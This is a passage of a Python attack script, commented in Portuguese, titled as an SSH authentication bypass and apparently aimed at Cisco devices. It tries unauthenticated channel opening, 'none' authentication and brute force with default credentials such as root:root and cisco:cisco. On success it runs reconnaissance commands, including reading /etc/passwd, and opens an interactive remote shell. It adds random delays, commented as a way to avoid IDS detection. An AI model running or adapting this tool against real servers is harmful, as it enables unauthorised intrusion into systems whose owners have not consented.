                                data = p['payload'][9:9+data_len]
                                sys.stdout.write(data.decode(errors='ignore'))
                                sys.stdout.flush()
                        elif p['msg_type'] == 0x5D:
                            print("\n[*] Canal fechado pelo servidor")
                            return
            if sys.stdin in ready:
                cmd = sys.stdin.readline()
                if cmd.strip() == "exit":
                    break
                data_bytes = cmd.encode()
                payload = b'\x5E' + struct.pack(">I", server_channel) + struct.pack(">I", len(data_bytes)) + data_bytes
                send_packet(sock, session_ctx, payload)
    except KeyboardInterrupt:
        print("\n[*] Encerrando...")

def _execute_via_channel(sock, session_ctx, server_channel, commands=None):
    """Executa comandos ou abre shell interativo"""
    if commands:
        print(f"\n    [+] Executando comandos via canal {server_channel}...")
        
        for cmd in commands:
            time.sleep(random.uniform(1.0, 3.0))
            
            exec_payload = build_channel_request_exec(server_channel, cmd)
            send_packet(sock, session_ctx, exec_payload)
            print(f"    [*] Comando: {cmd}")
            time.sleep(2.0)
            
            packets = read_ssh_packets_decrypted(sock, session_ctx, timeout_ms=5000)
            if packets:
                for p in packets:
                    if p['msg_type'] == 0x60:
                        if len(p['payload']) > 9:
                            data_len = struct.unpack(">I", p['payload'][5:9])[0]
                            data = p['payload'][9:9+data_len]
                            print(f"    [OUTPUT] {data.decode(errors='ignore')[:500]}")
                    elif p['msg_type'] == 0x5D:
                        print(f"    [*] Canal fechado")
                        return
            else:
                print(f"    [-] Sem resposta para comando")

def wait_for_channel_request_response(sock, session_ctx, channel_id, timeout_ms=5000):
    """Aguarda CHANNEL_SUCCESS ou CHANNEL_FAILURE para um channel específico."""
    deadline = time.time() + (timeout_ms / 1000.0)
    while time.time() < deadline:
        packets = read_ssh_packets_decrypted(sock, session_ctx, timeout_ms=500)
        if not packets:
            continue
        for p in packets:
            if p['msg_type'] == 0x63 and len(p['payload']) >= 5:
                recv_channel = struct.unpack(">I", p['payload'][1:5])[0]
                if recv_channel == channel_id:
                    return True
            elif p['msg_type'] == 0x64 and len(p['payload']) >= 5:
                recv_channel = struct.unpack(">I", p['payload'][1:5])[0]
                if recv_channel == channel_id:
                    return False
    return False


def request_pty_and_shell(sock, session_ctx, server_channel, term="vt100"):
    """Solicita PTY e shell no canal de sessão já aberto."""
    print(f"[*] Solicitando pty-req no canal {server_channel}...")
    pty_req = build_channel_request_pty(server_channel, term=term)
    send_packet(sock, session_ctx, pty_req)
    if not wait_for_channel_request_response(sock, session_ctx, server_channel, timeout_ms=5000):
        print("[-] pty-req falhou ou não recebeu resposta")
        return False

    print(f"[*] Solicitando shell no canal {server_channel}...")
    shell_req = build_channel_request_shell(server_channel)
    send_packet(sock, session_ctx, shell_req)
    if not wait_for_channel_request_response(sock, session_ctx, server_channel, timeout_ms=5000):
        print("[-] shell request falhou ou não recebeu resposta")
        return False

    print("[+] PTY e shell requisitados com sucesso")
    return True


def wait_for_channel_open_confirmation(sock, session_ctx, client_channel_id, timeout_ms=5000):
    """Aguarda CHANNEL_OPEN_CONFIRMATION ou CHANNEL_OPEN_FAILURE para um client channel."""
    deadline = time.time() + (timeout_ms / 1000.0)
    while time.time() < deadline:
        packets = read_ssh_packets_decrypted(sock, session_ctx, timeout_ms=500)
        if not packets:
            continue
        for p in packets:
            if p['msg_type'] == 0x5B and len(p['payload']) >= 9:
                recipient = struct.unpack(">I", p['payload'][1:5])[0]
                server_channel = struct.unpack(">I", p['payload'][5:9])[0]
                if recipient == client_channel_id:
                    return server_channel
            elif p['msg_type'] == 0x5C and len(p['payload']) >= 5:
                recipient = struct.unpack(">I", p['payload'][1:5])[0]
                if recipient == client_channel_id:
                    return None
    return None


def open_session_channel(sock, session_ctx, attempts=3, timeout_ms=6000):
    """Abre um canal de sessão e retorna o servidor channel ID confirmado."""
    for attempt in range(1, attempts + 1):
        channel_payload, client_channel_id = build_channel_open_direct()
        send_packet(sock, session_ctx, channel_payload)
        print(f"[*] CHANNEL_OPEN enviado (tentativa {attempt}/{attempts}, client_channel_id={client_channel_id})")

        server_channel = wait_for_channel_open_confirmation(sock, session_ctx, client_channel_id, timeout_ms=timeout_ms)
        if server_channel is not None:
            print(f"[+] CHANNEL_OPEN_CONFIRMATION recebido: server_channel={server_channel}")
            return server_channel

        print(f"[-] Sem CHANNEL_OPEN_CONFIRMATION para client_channel_id={client_channel_id} na tentativa {attempt}")
        time.sleep(0.5)

    return None


def _attempt_channel_and_exec(sock, session_ctx, commands):
    """Tenta abrir canal e executar comandos"""
    server_channel = open_session_channel(sock, session_ctx)
    if server_channel is None:
        return False

    if not request_pty_and_shell(sock, session_ctx, server_channel):
        return False

    _execute_via_channel(sock, session_ctx, server_channel, commands)
    return True

# ============================================================
# BYPASS DE AUTENTICAÇÃO
# ============================================================

def bypass_auth_struct_injection(sock, session_ctx, commands_to_exec=None):
    """Técnica de bypass pulando USERAUTH para CHANNEL_OPEN"""
    print("\n" + "="*60)
    print("  BYPASS DE AUTENTICAÇÃO - INJEÇÃO NA STRUCT")
    print("  Pulando USERAUTH, indo direto para CHANNEL_OPEN")
    print("="*60)

    if commands_to_exec is None:
        commands_to_exec = [
            "id",
            "whoami",
            "uname -a",
            "cat /proc/version",
            "hostname",
            "ifconfig 2>/dev/null || ip addr",
            "ps aux 2>/dev/null || ps -ef",
            "cat /etc/passwd 2>/dev/null | head -10",
        ]

    # ESTRATÉGIA 1: USERAUTH none com parsing detalhado
    print("\n[+] Estratégia 1: USERAUTH none com debug detalhado")
    for attempt in range(2):
        usernames = ["root", "admin"] if attempt == 0 else ["cisco", "user", "test"]
        
        for user in usernames:
            auth_none = build_userauth_request_none(user)
            send_packet(sock, session_ctx, auth_none)
            print(f"    [*] USERAUTH (none) enviado para: {user}")
            time.sleep(1.5)
            
            resp_packets = read_ssh_packets_decrypted(sock, session_ctx, timeout_ms=6000)
            if resp_packets:
                for p in resp_packets:
                    msg_type = p['msg_type']
                    print(f"    [*] Resposta recebida: MSG {msg_type} ({hex(msg_type)})")
                    
                    # MSG 52 = 0x34 = USERAUTH_SUCCESS
                    if msg_type == 0x34:
                        print(f"    [+] >>> USERAUTH BEM-SUCEDIDO PARA {user}! (MSG 52)")
                        time.sleep(2.0)
                        _attempt_channel_and_exec(sock, session_ctx, commands_to_exec)
                        return True
                    
                    # MSG 51 = 0x33 = USERAUTH_FAILURE
                    elif msg_type == 0x33:
                        print(f"    [-] Autenticação falhou para {user}")
                        if len(p['payload']) > 1:
                            methods_len = struct.unpack(">I", p['payload'][1:5])[0]
                            if methods_len > 0:
                                methods = p['payload'][5:5+methods_len].decode(errors='ignore')
                                print(f"    [*] Métodos suportados: {methods}")
                    
                    # MSG 60 = 0x3C = USERAUTH_PASSWD_CHANGEREQ
                    elif msg_type == 0x3C:
                        print(f"    [!] Servidor requer mudança de senha")
                    
                    else:
                        print(f"    [?] Resposta inesperada: {msg_type}")

    # ESTRATÉGIA 2: CHANNEL_OPEN SEM AUTENTICAÇÃO - Com melhor parsing
    print("\n[+] Estratégia 2: CHANNEL_OPEN direto sem USERAUTH")
    time.sleep(random.uniform(0.5, 1.5))

    print("    [DBG] Lendo pacotes antes de CHANNEL_OPEN")
    server_channel = open_session_channel(sock, session_ctx, attempts=4, timeout_ms=8000)
    if server_channel is None:
        print(f"    [-] Sem resposta ou confirmação de CHANNEL_OPEN após várias tentativas")
    else:
        print(f"    [+] >>> CANAL ABERTO COM SUCESSO! Server channel ID: {server_channel}")
        time.sleep(1.0)
        if not request_pty_and_shell(sock, session_ctx, server_channel):
            print(f"    [-] Não foi possível alocar PTY ou solicitar shell no canal {server_channel}")
            return False

        _execute_via_channel(sock, session_ctx, server_channel, commands_to_exec)
        return True

    # ESTRATÉGIA 3: Força bruta de credenciais com senhas variadas
    print("\n[+] Estratégia 3: Força bruta com credenciais comuns")
    common_creds = [
        ("root", ""), ("root", "root"), ("root", "password"),
        ("admin", ""), ("admin", "admin"), ("admin", "password"),
        ("cisco", ""), ("cisco", "cisco"),
        ("user", ""), ("user", "user"),
        ("test", ""), ("test", "test"),
    ]
    
    for user, password in common_creds[:6]:  # Limita a 6 tentativas
        auth_req = build_userauth_request(user, password)
        send_packet(sock, session_ctx, auth_req)
        print(f"    [*] Tentando: {user}:{password if password else '(vazio)'}")
        time.sleep(0.8)
        
        resp_packets = read_ssh_packets_decrypted(sock, session_ctx, timeout_ms=3000)
        if resp_packets:
            for p in resp_packets:
                if p['msg_type'] == 0x34:
                    print(f"    [+] >>> AUTH BEM-SUCEDIDA: {user}:{password}")
                    time.sleep(1.5)
                    _attempt_channel_and_exec(sock, session_ctx, commands_to_exec)
                    return True
    
    # ESTRATÉGIA 4: Direct-TCPIP com exploração de portais
    print("\n[+] Estratégia 4: Tunelização via direct-tcpip")
    time.sleep(random.uniform(0.5, 1.5))
    
    targets_to_try = [
        ("127.0.0.1", 22),
        ("localhost", 22),
        ("127.0.0.1", 80),
        ("127.0.0.1", 443),
    ]
    
    for t_host, t_port in targets_to_try[:2]:
        channel_payload, channel_id = build_channel_open_direct_tcpip(t_host, t_port)
        send_packet(sock, session_ctx, channel_payload)
        print(f"    [*] CHANNEL_OPEN direct-tcpip: {t_host}:{t_port}")
        time.sleep(1.5)
        
        resp_packets = read_ssh_packets_decrypted(sock, session_ctx, timeout_ms=5000)
        if resp_packets:
            for p in resp_packets:
                if p['msg_type'] == 0x5B:
                    print(f"    [+] >>> TUNEL ABERTO! {t_host}:{t_port}")
                    return True
    
    print("\n[-] Nenhuma estratégia de bypass funcionou")
    return False

# ============================================================
# LOOP DE SESSÃO
# ============================================================
def interactive_session(sock, session_ctx):
    """Shell interativo para enviar comandos durante sessão ativa"""
    print("\n[+] Shell interativo ativado!")
    print("[*] Comandos disponíveis:")
    print("    - exec <comando>: Executar comando (requer canal aberto)")
    print("    - help: Mostrar ajuda")
    print("    - sair: Fechar sessão")
    print()
    
    while True:
        try:
            cmd = input(">>> ").strip()
            
            if cmd == "sair":
                break
            elif cmd == "help":
                print("[*] Comandos: exec <cmd>, help, sair")
            elif cmd.startswith("exec "):
                command = cmd[5:]
                print(f"[*] Tentando executar: {command}")
                server_channel = open_session_channel(sock, session_ctx, attempts=4, timeout_ms=8000)
                if server_channel is None:
                    print("[-] Falha ao abrir canal de sessão")
                    continue
                print(f"[+] Canal aberto (ID: {server_channel})")
                if not request_pty_and_shell(sock, session_ctx, server_channel):
                    print("[-] Falha ao alocar PTY ou solicitar shell")
                    continue
                _execute_via_channel(sock, session_ctx, server_channel, [command])
            else:
                print("[*] Comando desconhecido. Digite 'help'")
        
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[-] Erro: {e}")

def enter_session_loop(sock, session_ctx, bypass_status=False):
    """Mantém sessão ativa com keepalives"""
    print("\n[*] Modo de sessão persistente")
    print(f"[*] Keepalives a cada {KEEPALIVE_INTERVAL}s")
    print(f"[*] Timeout de sessão: {SESSION_TIMEOUT}s")
    print("[*] Pressione CTRL+C para sair\n")
    
    start_time = time.time()
    last_keepalive = time.time()
    loop_count = 0
    last_activity = time.time()
    
    try:
        while True:
            now = time.time()
            elapsed = now - start_time
            idle_time = now - last_activity
            
            if elapsed > SESSION_TIMEOUT:
                print(f"\n[*] Sessão expirada ({SESSION_TIMEOUT}s)")
                break
            
            if (now - last_keepalive) >= KEEPALIVE_INTERVAL:
                try:
                    keepalive_pkt = build_keepalive()
                    send_packet(sock, session_ctx, keepalive_pkt)
                    last_keepalive = now
                    print(f"[*] Keepalive enviado ({int(elapsed)}s, inativo há {int(idle_time)}s)")
                except Exception as e:
                    print(f"[-] Keepalive falhou: {e}")
                    break
            
            ready, _, _ = select.select([sock], [], [], 0.5)
            if ready:
                try:
                    packets = read_ssh_packets_decrypted(sock, session_ctx, timeout_ms=2000)
                    if packets:
                        last_activity = time.time()
                        for p in packets:
                            print(f"    [PACKET] MSG {p['msg_type']} ({len(p['payload'])} bytes)")
                            if p['msg_type'] == 0x64:
                                data_len = struct.unpack(">I", p['payload'][5:9])[0] if len(p['payload']) > 9 else 0
                                if data_len > 0:
                                    data = p['payload'][9:9+data_len]
                                    print(f"    [DATA] {data.decode(errors='ignore')[:200]}")
                except Exception as e:
                    print(f"    [!] Erro lendo pacote: {e}")
            
            loop_count += 1
    
    except KeyboardInterrupt:
        print("\n[*] Interrompido")
    except Exception as e:
        print(f"[-] Erro: {e}")

# ============================================================
# CONEXÃO
# ============================================================
def debug_log_packets(packets, context=""):
    if not packets:
        print(f"    [DBG] {context} nenhum pacote SSH parseado")
        return

    types = [hex(p['msg_type']) for p in packets]
    print(f"    [DBG] {context} {len(packets)} pacote(s) parseado(s): {types}")
    for p in packets:
        payload_preview = p['payload'][:32]
        print(f"        [DBG] MSG {hex(p['msg_type'])} len={len(p['payload'])} payload={payload_preview.hex()}...")


def read_ssh_packets_decrypted(sock, session_ctx, timeout_ms=5000):
    """Lê e descriptografa pacotes SSH após NEWKEYS"""
    data = read_all_extended(sock, timeout_ms)
    if not data:
        print(f"    [DBG] Nenhum dado recebido no timeout de {timeout_ms}ms")
        return []
    
    try:
        plaintext = session_ctx.decrypt_packet(data)
        if plaintext is None:
            print(f"    [!] Falha na descriptografia")
            return []
        
        packets = read_ssh_packets(plaintext)
        debug_log_packets(packets, "SSH-decrypt")
        return packets
    
    except Exception as e:
        print(f"    [!] Erro descriptografando: {e}")
        return []


def handle_post_handshake(sock, session_ctx, kex_algo):
    """Pós-handshake: SERVICE_REQUEST + BYPASS"""
    print("\n[+] Handshake SSH completo!")
    
    print("[*] Solicitando serviço ssh-userauth...")
    send_packet(sock, session_ctx, build_service_request("ssh-userauth"))
    time.sleep(1.5)
    
    resp_packets = read_ssh_packets_decrypted(sock, session_ctx, timeout_ms=5000)
    if resp_packets:
        for p in resp_packets:
            if p['msg_type'] == 6:
                print("[+] >>> SERVICE_ACCEPT! Aplicando bypass...")
                bypass_ok = bypass_auth_struct_injection(sock, session_ctx)
                
                if bypass_ok:
                    print("\n[+] BYPASS BEM-SUCEDIDO!")
                    print("[*] Abrindo shell interativo...")
                    interactive_session(sock, session_ctx)
                else:
                    print("\n[*] Bypass não funcionou.")
                    print("[*] Mantendo sessão ativa...")
                    enter_session_loop(sock, session_ctx, bypass_status=False)
                return
            elif p['msg_type'] == 5:
                print("[*] Servidor solicitou serviço alternativo")
    
    print("[*] Sem SERVICE_ACCEPT. Tentando bypass diretamente...")
    bypass_ok = bypass_auth_struct_injection(sock, session_ctx)
    
    if bypass_ok:
        print("\n[+] BYPASS BEM-SUCEDIDO!")
        print("[*] Abrindo shell interativo...")
        interactive_session(sock, session_ctx)
    else:
        print("\n[*] Mantendo sessão ativa...")
        enter_session_loop(sock, session_ctx, bypass_status=False)


KEX_ORDER = ['ssh-dss', 'ssh-rsa', 'diffie-hellman-group1-sha1', 'diffie-hellman-group14-sha1', 'diffie-hellman-group14-sha256']
def run_diagnostic_loop(target_ip, port):
    """
    Executa a matriz de algoritmos tentando encontrar o handshake estável.
    """
    success_found = False
    KEX_ORDER = ['ssh-dss', 'ssh-rsa', 'diffie-hellman-group1-sha1', 'diffie-hellman-group14-sha1', 'diffie-hellman-group14-sha256']    
    for kex in KEX_ORDER:
        print(f"\n[*] Testando algoritmo: {kex}")
        
        # 1. Criação e Configuração do Socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        setup_socket_resilience(sock) # Aplica SO_LINGER e KeepAlive
        
        try:
            sock.connect((target_ip, port))
            # 2. Handshake Inicial (Banner)
            # Nota: Você deve enviar seu banner aqui (ex: SSH-2.0-Cisco-1.25)
            # e ler o banner do servidor antes de chamar perform_kexdh
            
            # Definindo parâmetros para o KEX
            key_size = 256 # O padrão para a maioria dos alvos
            # Chamada da sua função resiliente
            success, result = perform_kexdh(sock, kex, key_size, "auto", "SSH-2.0-Cisco-1.25", "", b"", b"")
            
            if success:
                print(f"[+] Handshake bem sucedido com {kex}!")
                print(f"[+] Dados da sessão: {result}")
                
                # --- AQUI VOCÊ INSERE A INJEÇÃO DE COMANDO (GRUB/KERNEL) ---
                # Exemplo: send_injection_command(sock)
                
                success_found = True
                break
            else:
                print(f"[-] Falha no handshake com {kex}. Tentando próximo...")
                
        except Exception as e:
            print(f"[!] Erro de conexão com {kex}: {e}")
        
        finally:
            # Encerramento seguro para evitar RST
            sock.close()
            
    if not success_found:
        print("\n[!] Matriz varrida sem sucesso. Servidor pode estar protegendo o handshake.")

## ============================================================
# MAIN APRIMORADA (Com Matriz de Diagnóstico)
# ============================================================
def main():
    print("+------------------------------------------------------+")
    print("|  SSH Auth Bypass - Injeção na Struct pós-ACCEPT      |")
    print("+------------------------------------------------------+")
    
    # Matriz de algoritmos para varredura resiliente
    KEX_ORDER = [
        "diffie-hellman-group14-sha256",
        "diffie-hellman-group14-sha1",
        "diffie-hellman-group1-sha1"
    ]
    
    # Configurações base
    key_size = 128
    variant = "auto"
    
    # ================================================================
    # LOOP PRINCIPAL: Varredura da Matriz de Algoritmos
    # ================================================================
    for kex_algo in KEX_ORDER:
        print(f"\n{'='*60}")
        print(f"[*] Testando Algoritmo: {kex_algo}")
        print(f"{'='*60}")
        
        # 1. CONECTAR E FAZER HANDSHAKE
        print(f"[*] Conectando a {TARGET}:{PORT}...")
        
        try:
            # Chama a função de conexão que inclui o handshake resiliente
            sock, session_ctx, handshake_ok = connect_and_handshake(TARGET, PORT, kex_algo, key_size, variant, None, None)
            
            if sock is None or not handshake_ok:
                print(f"[-] Handshake falhou com {kex_algo}. Tentando próximo...")
                if sock: sock.close()
                continue
            
            print(f"[+] Handshake estabelecido com {kex_algo}!")

            # 2. HANDLE PÓS-HANDSHAKE (SERVICE_REQUEST + BYPASS)
            # Aqui entramos na fase de injeção após a negociação bem sucedida
            handle_post_handshake(sock, session_ctx, kex_algo)
            print(f"\n[+] Ciclo de bypass completado com sucesso usando {kex_algo}!")
            
            # Se chegamos aqui, o bypass foi injetado com sucesso
            break 
            
        except Exception as e:
            print(f"\n[-] Erro durante bypass com {kex_algo}: {e}")
            try:
                if 'sock' in locals(): sock.close()
            except:
                pass
        
        # Intervalo entre diferentes algoritmos para evitar flags de IDS
        print(f"[*] Aguardando 3 segundos antes da próxima tentativa...")
        time.sleep(3)
    
    print(f"\n{'='*60}")
    print(f"[*] Execução finalizada")
    print(f"{'='*60}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[*] Interrompido pelo usuário (CTRL+C)")
    except Exception as e:
        print(f"\n[-] Erro fatal: {e}")